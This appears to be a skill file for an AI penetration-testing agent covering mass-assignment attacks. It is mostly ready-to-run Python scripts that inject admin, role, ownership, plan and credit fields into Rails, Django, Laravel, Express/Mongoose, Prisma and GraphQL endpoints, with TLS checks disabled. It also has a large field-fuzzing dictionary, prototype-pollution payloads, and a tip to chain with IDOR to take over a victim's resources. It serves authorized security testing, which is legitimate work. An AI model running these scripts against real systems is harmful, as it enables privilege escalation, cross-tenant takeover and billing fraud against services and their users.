<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: mass-assignment
description: Mass assignment testing with framework-specific exploitation scripts for Rails, Django, Laravel, Node.js/Express, Mongoose, and Prisma
---

# Mass Assignment

Mass assignment binds client-supplied fields directly into models/DTOs without field-level allowlists. It commonly leads to privilege escalation, ownership changes, and unauthorized state transitions in modern APIs and GraphQL.

---

## Framework-Specific Exploitation

### Rails — Strong Parameters Bypass

Rails uses `params.require(...).permit(...)` — mass assignment occurs when:
- `permit!` is used (permits ALL fields)
- Nested params are not filtered
- `accepts_nested_attributes_for` is combined with weak permits

**Detection pattern:**
```python
#!/usr/bin/env python3
"""
Rails mass assignment tester.
Injects extra fields into a create/update request and checks if they persist.

Usage: python3 rails_mass_assign.py \
       --url https://app.target.com/users/123 \
       --method PATCH \
       --token "Bearer <token>" \
       --base '{"user": {"name": "test"}}' \
       --inject '{"user": {"role": "admin", "admin": true, "is_admin": true}}'
"""
import json, ssl, argparse, sys
from urllib.request import urlopen, Request
from urllib.error import HTTPError

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def do_request(url, method, token, body):
    data = json.dumps(body).encode()
    req = Request(url, data=data, method=method, headers={
        "Authorization": token,
        "Content-Type": "application/json",
        "Accept": "application/json"
    })
    try:
        resp = urlopen(req, context=ctx, timeout=15)
        return resp.status, json.loads(resp.read())
    except HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True)
parser.add_argument("--get-url", help="GET URL to verify state (default: same as --url)")
parser.add_argument("--method", default="PATCH")
parser.add_argument("--token", required=True)
parser.add_argument("--base", required=True, help="JSON: baseline legitimate request body")
parser.add_argument("--inject", required=True, help="JSON: body with extra fields to inject")
args = parser.parse_args()

base_body = json.loads(args.base)
inject_body = json.loads(args.inject)
get_url = args.get_url or args.url

# Step 1: Capture baseline state
print("[1] Baseline GET (current state):")
status, before = do_request(get_url, "GET", args.token, None)
print(f"  HTTP {status}: {json.dumps(before)[:300]}")

# Step 2: Send legitimate request (no injected fields)
print(f"\n[2] Sending legitimate {args.method} (baseline, no injection):")
status, resp = do_request(args.url, args.method, args.token, base_body)
print(f"  HTTP {status}: {json.dumps(resp)[:200]}")

# Step 3: GET state after baseline
print("\n[3] State after baseline update:")
status, mid = do_request(get_url, "GET", args.token, None)
print(f"  HTTP {status}: {json.dumps(mid)[:300]}")

# Step 4: Send with injected fields
print(f"\n[4] Sending {args.method} WITH injected fields:")
status, injected_resp = do_request(args.url, args.method, args.token, inject_body)
print(f"  HTTP {status}: {json.dumps(injected_resp)[:300]}")

# Step 5: GET state after injection — confirm if forbidden fields persisted
print("\n[5] State AFTER injection (checking if fields persisted):")
status, after = do_request(get_url, "GET", args.token, None)
print(f"  HTTP {status}: {json.dumps(after)[:300]}")

# Step 6: Diff before vs after
print("\n[DIFF] Before vs After:")
def flatten(obj, prefix=""):
    result = {}
    if isinstance(obj, dict):
        for k, v in obj.items():
            result.update(flatten(v, f"{prefix}.{k}" if prefix else k))
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            result.update(flatten(v, f"{prefix}[{i}]"))
    else:
        result[prefix] = obj
    return result

before_flat = flatten(before)
after_flat = flatten(after)

changed = []
for k in set(list(before_flat.keys()) + list(after_flat.keys())):
    bv = before_flat.get(k, "<missing>")
    av = after_flat.get(k, "<missing>")
    if bv != av:
        changed.append((k, bv, av))
        flag = "[MASS ASSIGNMENT]" if any(s in k.lower() for s in ["admin", "role", "permission", "owner", "tenant", "plan", "tier", "verified", "status", "credit", "limit"]) else "[CHANGED]"
        print(f"  {flag} {k}: {bv!r} → {av!r}")

if not changed:
    print("  No changes detected — server likely ignored injected fields")
```

---

### Django REST Framework — Serializer Field Bypass

DRF mass assignment occurs when:
- `read_only_fields` is missing for sensitive fields
- `partial=True` combined with missing field restrictions
- Nested serializers are writable without explicit field control

**Sensitive fields to inject in DRF apps:**
```python
DJANGO_INJECTION_CANDIDATES = {
    # User model common fields
    "is_staff": True,
    "is_superuser": True,
    "is_active": True,
    "date_joined": "2020-01-01T00:00:00Z",
    # Profile extras
    "role": "admin",
    "tier": "premium",
    "verified": True,
    "email_verified": True,
    # Ownership
    "user": 1,
    "user_id": 1,
    "owner_id": 1,
    "organization_id": "ORG_ID_HERE",
}

# DRF often accepts extra_kwargs override via PATCH with partial=True
# Try patching with Content-Type: application/json AND multipart/form-data
# DRF serializers may have different validation per content type
```

**Multi-encoding tester:**
```python
#!/usr/bin/env python3
"""
Multi-encoding mass assignment tester.
Tests the same injected field across JSON, form-encoded, and multipart.
"""
import ssl, json, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError
import urllib.parse

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def test_json(url, method, token, body):
    req = Request(url, data=json.dumps(body).encode(), method=method, headers={
        "Authorization": token, "Content-Type": "application/json"
    })
    try:
        resp = urlopen(req, context=ctx, timeout=10)
        return resp.status, resp.read()[:200]
    except HTTPError as e:
        return e.code, b""

def test_form(url, method, token, flat_body):
    """Flat dict only — form encoding doesn't support nested."""
    encoded = urllib.parse.urlencode(flat_body).encode()
    req = Request(url, data=encoded, method=method, headers={
        "Authorization": token, "Content-Type": "application/x-www-form-urlencoded"
    })
    try:
        resp = urlopen(req, context=ctx, timeout=10)
        return resp.status, resp.read()[:200]
    except HTTPError as e:
        return e.code, b""

def test_multipart(url, method, token, flat_body):
    boundary = "----BoundaryXYZ789"
    parts = []
    for k, v in flat_body.items():
        parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}')
    body = ("\r\n".join(parts) + f"\r\n--{boundary}--\r\n").encode()
    req = Request(url, data=body, method=method, headers={
        "Authorization": token,
        "Content-Type": f"multipart/form-data; boundary={boundary}"
    })
    try:
        resp = urlopen(req, context=ctx, timeout=10)
        return resp.status, resp.read()[:200]
    except HTTPError as e:
        return e.code, b""

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True)
parser.add_argument("--method", default="PATCH")
parser.add_argument("--token", required=True)
parser.add_argument("--field", required=True, help="Field name to inject (e.g. 'is_admin')")
parser.add_argument("--value", required=True, help="Field value to inject (e.g. 'true')")
args = parser.parse_args()

flat = {args.field: args.value}
nested = {"user": flat}  # Rails-style wrapper

print(f"[*] Testing injection of {args.field}={args.value}")
print(f"    Target: {args.method} {args.url}\n")

print("  [JSON flat]     ", end="")
s, b = test_json(args.url, args.method, args.token, flat)
print(f"HTTP {s}")

print("  [JSON nested]   ", end="")
s, b = test_json(args.url, args.method, args.token, nested)
print(f"HTTP {s}")

print("  [Form-encoded]  ", end="")
s, b = test_form(args.url, args.method, args.token, flat)
print(f"HTTP {s}")

print("  [Multipart]     ", end="")
s, b = test_multipart(args.url, args.method, args.token, flat)
print(f"HTTP {s}")

print("  [JSON dot.path] ", end="")
dot = {f"user.{args.field}": args.value}
s, b = test_json(args.url, args.method, args.token, dot)
print(f"HTTP {s}")

print("  [Bracket path]  ", end="")
bracket = {f"user[{args.field}]": args.value}
s, b = test_form(args.url, args.method, args.token, bracket)
print(f"HTTP {s}")

print("\nNext: GET resource and verify if field persisted")
```

---

### Node.js / Express — Body Parser Direct Bind

Express with `app.use(express.json())` and direct `req.body` assignment:
```javascript
// Vulnerable pattern:
User.findByIdAndUpdate(req.params.id, req.body, { new: true })
// No field filtering — attacker controls all top-level fields
```

**Attack payload for Express/Mongoose targets:**
```python
NODE_INJECTION_CANDIDATES = [
    # Privilege escalation
    {"isAdmin": True},
    {"role": "admin"},
    {"roles": ["admin"]},
    {"permissions": ["*"]},
    {"__v": 0, "isAdmin": True},  # Bypass version check
    # Ownership
    {"userId": "VICTIM_ID"},
    {"owner": "VICTIM_ID"},
    {"createdBy": "VICTIM_ID"},
    # Mongoose-specific: __proto__ pollution via body
    {"__proto__": {"isAdmin": True}},
    {"constructor": {"prototype": {"isAdmin": True}}},
    # Nested model injection
    {"profile": {"isAdmin": True, "role": "admin"}},
    {"settings": {"admin": True, "tier": "enterprise"}},
    # Quota manipulation
    {"usageLimit": 999999},
    {"monthlyRequests": 0},
    {"credits": 10000},
    # Plan manipulation
    {"plan": "enterprise"},
    {"tier": "premium"},
    {"subscription": {"plan": "pro", "status": "active"}},
]
```

---

### Laravel — $fillable and $guarded Bypass

Laravel mass assignment via Eloquent:
```php
// Vulnerable — guarded=[] means everything fillable
protected $guarded = [];

// Also vulnerable — specific field in fillable
protected $fillable = ['name', 'email', 'role'];  // 'role' should NOT be here
```

**Test vector for Laravel endpoints:**
```python
LARAVEL_CANDIDATES = {
    # Standard Eloquent model fields
    "role": "admin",
    "is_admin": 1,
    "admin": 1,
    "verified": 1,
    "email_verified_at": "2024-01-01 00:00:00",
    "deleted_at": None,  # Soft delete undelete
    "remember_token": "ATTACKER_TOKEN",
    # Relationships
    "user_id": 1,
    "account_id": 1,
    "company_id": 1,
    # Feature flags
    "premium": 1,
    "beta_access": 1,
    "trial_ends_at": "2099-12-31 00:00:00",
    # Laravel Passport/Sanctum abuse
    "_method": "DELETE",  # Method override
    "_token": "",  # CSRF bypass attempt
}
```

---

### Mongoose / Prisma — Schema Path Injection

Mongoose `select: false` prevents reading a field but **does not prevent writing it**.

```javascript
// Mongoose schema — 'role' is select:false (hidden from reads)
const userSchema = new Schema({
  name: String,
  role: { type: String, default: 'user', select: false }  // Hidden but writable!
});

// Prisma — no select: false equivalent; relies on explicit field exclusion
// Vulnerable:
await prisma.user.update({ where: { id }, data: req.body })
// All req.body fields applied — role, isAdmin, etc.
```

**Mongoose-specific injection test:**
```python
#!/usr/bin/env python3
"""
Mongoose/Prisma mass assignment tester.
Tests that hidden (select:false) fields can still be written.
"""
import ssl, json, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

MONGOOSE_CANDIDATES = [
    {"role": "admin"},
    {"isAdmin": True},
    {"__v": -1},           # Bypass optimistic concurrency
    {"_id": "000000000000000000000001"},  # Object ID manipulation
    {"createdAt": "2020-01-01T00:00:00Z"},
    {"updatedAt": "2020-01-01T00:00:00Z"},
    {"__proto__": {"role": "admin"}},     # Prototype pollution via body
    {"constructor.prototype.role": "admin"},  # Dot-notation proto pollution
]

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True, help="PATCH/PUT endpoint URL")
parser.add_argument("--get-url", help="GET URL to read back the object")
parser.add_argument("--token", required=True)
args = parser.parse_args()

def req(url, method, token, body=None):
    req_obj = Request(url, method=method,
                      data=json.dumps(body).encode() if body else None,
                      headers={"Authorization": token,
                                "Content-Type": "application/json",
                                "Accept": "application/json"})
    try:
        resp = urlopen(req_obj, context=ctx, timeout=10)
        return resp.status, json.loads(resp.read())
    except HTTPError as e:
        return e.code, {}

get_url = args.get_url or args.url
status_before, before = req(get_url, "GET", args.token)
print(f"[BEFORE] {json.dumps(before)[:300]}")

for candidate in MONGOOSE_CANDIDATES:
    status, resp = req(args.url, "PATCH", args.token, candidate)
    if status in (200, 201, 204):
        status_after, after = req(get_url, "GET", args.token)
        # Check if injected field appears in response
        candidate_keys = list(candidate.keys())
        visible_changes = {k: after.get(k) for k in candidate_keys if after.get(k) != before.get(k)}
        if visible_changes:
            print(f"[MASS ASSIGNMENT] {candidate} → {visible_changes}")
        else:
            print(f"[OK/HIDDEN] {candidate} → HTTP {status}, no visible change (may still persist)")
    else:
        print(f"[REJECTED] {candidate} → HTTP {status}")
```

---

### GraphQL — Input Type Field Injection

GraphQL mutation inputs are often mapped directly to ORM models. Missing allowlist on `InputType` allows unauthorized field writes.

```python
#!/usr/bin/env python3
"""
GraphQL mass assignment via mutation input injection.
Injects extra fields into mutation inputs and checks if they persist.
"""
import ssl, json, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Common GraphQL mutation targets for mass assignment
GRAPHQL_CANDIDATES = [
    # Wrap in the appropriate input type name for the target
    '{ "isAdmin": true }',
    '{ "role": "ADMIN" }',
    '{ "tier": "ENTERPRISE" }',
    '{ "verified": true }',
    '{ "permissions": ["ALL"] }',
    '{ "ownerId": "VICTIM_USER_ID" }',
    '{ "organizationId": "TARGET_ORG_ID" }',
    '{ "creditBalance": 99999 }',
    '{ "plan": "premium" }',
    '{ "trialEndsAt": "2099-12-31" }',
]

def gql(url, token, query, variables=None):
    payload = {"query": query, "variables": variables or {}}
    req = Request(url, data=json.dumps(payload).encode(), headers={
        "Authorization": token,
        "Content-Type": "application/json",
        "Accept": "application/json"
    })
    try:
        resp = urlopen(req, context=ctx, timeout=15)
        return resp.status, json.loads(resp.read())
    except HTTPError as e:
        return e.code, {}

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True)
parser.add_argument("--token", required=True)
parser.add_argument("--mutation", required=True, help="Mutation name (e.g. 'updateUser')")
parser.add_argument("--input-type", required=True, help="Input type variable name (e.g. 'input')")
parser.add_argument("--user-id", required=True, help="Your own user ID to check state")
args = parser.parse_args()

# First: introspect the input type to see available fields
INTROSPECT = """
query {
  __type(name: "MUTATION_NAME") {
    name
    args {
      name
      type {
        name
        kind
        inputFields {
          name
          type { name kind }
        }
      }
    }
  }
}
""".replace("MUTATION_NAME", args.mutation)

# Test each candidate by adding it to a minimal mutation
for candidate_str in GRAPHQL_CANDIDATES:
    candidate = json.loads(candidate_str)
    field_name = list(candidate.keys())[0]
    field_value = list(candidate.values())[0]

    # Build mutation with the candidate field injected
    if isinstance(field_value, bool):
        gql_val = str(field_value).lower()
    elif isinstance(field_value, str):
        gql_val = f'"{field_value}"'
    elif isinstance(field_value, int):
        gql_val = str(field_value)
    elif isinstance(field_value, list):
        gql_val = json.dumps(field_value)
    else:
        gql_val = json.dumps(field_value)

    mutation = f"""
    mutation TestMassAssignment {{
      {args.mutation}({args.input_type}: {{
        id: "{args.user_id}"
        {field_name}: {gql_val}
      }}) {{
        id
        {field_name}
        ... on User {{
          role
          isAdmin
          tier
          plan
        }}
      }}
    }}
    """

    status, resp = gql(args.url, args.token, mutation)
    errors = resp.get("errors", [])
    data = resp.get("data", {}).get(args.mutation)

    if errors:
        # Check if error is "unknown field" vs "unauthorized" — different signals
        err_msg = errors[0].get("message", "")
        if "cannot" in err_msg.lower() or "not found" in err_msg.lower():
            print(f"[REJECTED] {field_name}: Field unknown or rejected — {err_msg[:80]}")
        elif "permission" in err_msg.lower() or "unauthorized" in err_msg.lower():
            print(f"[AUTHZ] {field_name}: Authorization check triggered — field likely exists but protected")
        else:
            print(f"[ERROR] {field_name}: {err_msg[:80]}")
    elif data:
        # Check if field was accepted and returned
        if data.get(field_name) == field_value:
            print(f"[MASS ASSIGNMENT] {field_name}={field_value} accepted AND returned in response")
        elif data.get(field_name):
            print(f"[POSSIBLE] {field_name} returned value: {data.get(field_name)} (injected: {field_value})")
        else:
            print(f"[UNKNOWN] {field_name}: mutation succeeded but field not in response (may still persist)")
    else:
        print(f"[HTTP {status}] {field_name}: no data")
```

---

## Automated Field Dictionary Attack

```python
#!/usr/bin/env python3
"""
Comprehensive mass assignment field dictionary attacker.
Iterates over a large field dictionary against a target endpoint.

Usage: python3 mass_assign_dict.py \
       --url https://api.target.com/api/users/me \
       --method PATCH --token "Bearer <token>"
"""
import ssl, json, argparse, time
from urllib.request import urlopen, Request
from urllib.error import HTTPError

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Comprehensive sensitive field dictionary
FIELD_DICT = {
    # Privilege escalation
    "isAdmin": [True, "true", 1, "1"],
    "admin": [True, "true", 1],
    "is_admin": [True, "true", 1],
    "role": ["admin", "superadmin", "staff", "moderator", "owner"],
    "roles": [["admin"], ["superadmin"]],
    "userType": ["admin", "staff", "internal"],
    "user_type": ["admin", "staff"],
    "accountType": ["admin", "premium", "enterprise"],
    "permissions": [["*"], ["admin:all"], ["read:all", "write:all"]],
    "scope": ["admin", "*", "all"],
    "staff": [True, 1],
    "superuser": [True, 1],
    "is_superuser": [True, 1],
    "isSuperAdmin": [True, 1],
    "isStaff": [True, 1],
    # Verification bypass
    "verified": [True, 1],
    "emailVerified": [True, 1],
    "email_verified": [True, 1],
    "phoneVerified": [True, 1],
    "kycVerified": [True, 1],
    "identityVerified": [True, 1],
    "approved": [True, 1],
    # Ownership takeover
    "userId": ["1", "2", "VICTIM_ID"],
    "user_id": ["1", "2"],
    "ownerId": ["1", "VICTIM_ID"],
    "owner_id": ["1"],
    "accountId": ["1", "ACCOUNT_ID"],
    "account_id": ["1"],
    "organizationId": ["ORG_ID"],
    "tenantId": ["TENANT_ID"],
    "createdBy": ["1"],
    # Feature/plan gates
    "plan": ["enterprise", "premium", "pro", "unlimited"],
    "tier": ["enterprise", "premium", "gold"],
    "subscription": ["premium", "enterprise"],
    "premium": [True, 1],
    "isPremium": [True, 1],
    "betaAccess": [True, 1],
    "beta_access": [True, 1],
    # Quota manipulation
    "usageLimit": [999999, -1],
    "monthlyLimit": [999999],
    "apiLimit": [999999],
    "seatCount": [999, -1],
    "maxProjects": [999],
    "credits": [99999],
    "creditBalance": [99999],
    "balance": [99999],
    # Status manipulation
    "status": ["active", "approved", "verified"],
    "accountStatus": ["active", "verified"],
    "subscriptionStatus": ["active"],
    "trialEndsAt": ["2099-12-31", "2099-12-31T00:00:00Z"],
    "trial_ends_at": ["2099-12-31"],
    "expiresAt": ["2099-12-31T00:00:00Z"],
}

def req(url, method, token, body):
    req_obj = Request(url, method=method, data=json.dumps(body).encode(), headers={
        "Authorization": token, "Content-Type": "application/json", "Accept": "application/json"
    })
    try:
        resp = urlopen(req_obj, context=ctx, timeout=10)
        return resp.status, json.loads(resp.read())
    except HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True)
parser.add_argument("--method", default="PATCH")
parser.add_argument("--token", required=True)
parser.add_argument("--get-url", help="URL to verify state changes")
parser.add_argument("--delay", type=float, default=0.1)
args = parser.parse_args()

get_url = args.get_url or args.url

# Baseline
status, before = req(get_url, "GET", args.token, {})
print(f"[*] Baseline state: HTTP {status}")

findings = []
for field, values in FIELD_DICT.items():
    for val in values[:1]:  # Test first value only to reduce noise
        body = {field: val}
        status, resp = req(args.url, args.method, args.token, body)
        if status in (200, 201, 204):
            # Verify if field appeared/changed in state
            status_after, after = req(get_url, "GET", args.token, {})
            after_val = after.get(field) or after.get("data", {}).get(field)
            if after_val and str(after_val) != str(before.get(field)):
                print(f"[MASS ASSIGNMENT CONFIRMED] {field}={val} → persisted as: {after_val}")
                findings.append({"field": field, "injected": val, "result": after_val})
            elif field in str(resp):
                print(f"[POSSIBLE] {field}={val} → HTTP {status}, field appeared in response")
        time.sleep(args.delay)

print(f"\n[*] Confirmed mass assignment: {len(findings)}")
for f in findings:
    print(f"  {f['field']}: {f['injected']} → {f['result']}")
```

---

## Attack Surface

- REST/JSON, GraphQL inputs, form-encoded and multipart bodies
- Model binding in controllers/resolvers; ORM create/update helpers
- Writable nested relations, sparse/patch updates, bulk endpoints
- Registration/signup endpoints (highest impact — sets initial role)
- Profile update endpoints
- Admin API endpoints missing field allowlists

## Key Vulnerability Patterns

### Privilege Escalation

- Set role/isAdmin/permissions during signup/profile update
- Toggle admin/staff flags where exposed
- **Highest value**: inject `isAdmin: true` or `role: admin` during account creation

### Ownership Takeover

- Change ownerId/accountId/tenantId to seize resources
- Move objects across users/tenants

### Feature Gate Bypass

- Enable premium/beta/feature flags via flags/features fields
- Raise limits/seatCount/quotas

### Billing and Entitlements

- Modify plan/price/prorate/trialEnd or creditBalance
- Bypass server recomputation

### Nested and Relation Writes

- Writable nested serializers or ORM relations allow creating or linking related objects beyond caller's scope

## Bypass Techniques

**Content-Type Switching**
- Switch JSON ↔ form-encoded ↔ multipart ↔ text/plain; some code paths only validate one

**Key Path Variants**
- Dot/bracket/object re-shaping to reach nested fields through different binders
- `{"user.role": "admin"}` vs `{"user": {"role": "admin"}}` vs `user[role]=admin`

**Duplicate Keys**
- `{"role": "user", "role": "admin"}` — parser precedence varies (last wins in most)
- Test both orders

**Batch Paths**
- Per-item checks skipped in bulk operations
- Insert a single malicious object within a large batch

**Registration Endpoint (Highest Priority)**
- Signup forms often lack mass assignment protection as they're "write-only"
- Inject `isAdmin`, `role`, `verified` at account creation time

## Validation Requirements

1. Show a minimal request where adding a sensitive field changes persisted state for a non-privileged caller
2. Provide before/after evidence (response body, subsequent GET, or GraphQL query) proving the forbidden attribute value
3. Demonstrate consistency across at least two encodings or channels
4. For nested/bulk, show that protected fields are written within child objects or array elements
5. Quantify impact (e.g., role flip, cross-tenant move, quota increase) and reproducibility

**Minimum proof set:**
```
Request 1: PATCH /api/users/me {"role": "admin"}  → HTTP 200
Request 2: GET /api/users/me                       → {"role": "admin"}  ← persisted
Request 3: Confirm role grants admin access (e.g., GET /api/admin/users → HTTP 200)
```

## False Positives

- Server recomputes derived fields (plan/price/role) ignoring client input
- Fields marked read-only and enforced consistently across encodings
- Only UI-side changes with no persisted effect
- Field accepted in response but re-computed server-side before storage

## Impact

- Privilege escalation and admin feature access — CVSS 9.8 (PR:N → Admin)
- Cross-tenant or cross-account resource takeover — CVSS 8.8
- Financial/billing manipulation and quota abuse — CVSS 7.5
- Policy/approval bypass by toggling verification or status flags

## Pro Tips

1. Always test the registration/signup endpoint first — it's write-only and often lacks protections
2. Build a sensitive-field dictionary per resource and fuzz systematically
3. Always try alternate shapes and encodings; many validators are shape/CT-specific
4. For GraphQL, diff the resource immediately after mutation; effects are often visible even if the mutation returns filtered fields
5. Inspect SDKs/mobile apps for hidden field names and nested write examples
6. Test `select: false` Mongoose fields — hidden from reads but often writable
7. In Rails, test `accepts_nested_attributes_for` — frequently permits overly broad writes
8. Prefer minimal PoCs that prove durable state changes; avoid UI-only effects
9. Chain with IDOR: first use IDOR to find victim user IDs, then mass-assign ownerId to take over their resources
